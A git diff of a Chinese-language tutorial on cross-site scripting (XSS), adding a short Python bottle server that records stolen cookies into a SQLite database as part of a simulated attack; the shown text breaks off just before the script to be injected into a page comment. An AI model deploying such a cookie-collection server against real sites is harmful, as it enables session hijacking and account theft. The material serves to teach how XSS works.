@@ -8,8 +8,35 @@
 
 >XSS 全称“跨站脚本”，是注入攻击的一种。其特点是不对服务器端造成任何伤害，而是通过一些正常的站内交互途径，  
 例如发布评论，提交含有 JavaScript 的内容文本。  
-这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。  
+这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。 
 
+- 也可以是盗号或者其他未授权的操作——我们来模拟一下这个过程，先建立一个用来收集信息的服务器：
+```
+#!/usr/bin/env python
+#-*- coding:utf-8 -*-
+
+"""
+跨站脚本注入的信息收集服务器
+"""
+
+import bottle
+
+app = bottle.Bottle()
+plugin = bottle.ext.sqlite.Plugin(dbfile='/var/db/myxss.sqlite')
+app.install(plugin)
+
+@app.route('/myxss/')
+def show(cookies, db):
+    SQL = 'INSERT INTO "myxss" ("cookies") VALUES (?)'
+    try:
+        db.execute(SQL, cookies)
+    except:
+        pass
+    return ""
+
+if __name__ == "__main__":
+    app.run()
+```
 - 在某一个页面的评论中注入这段代码：
 
 // 用 <script type="text/javascript"></script> 包起来放在评论中
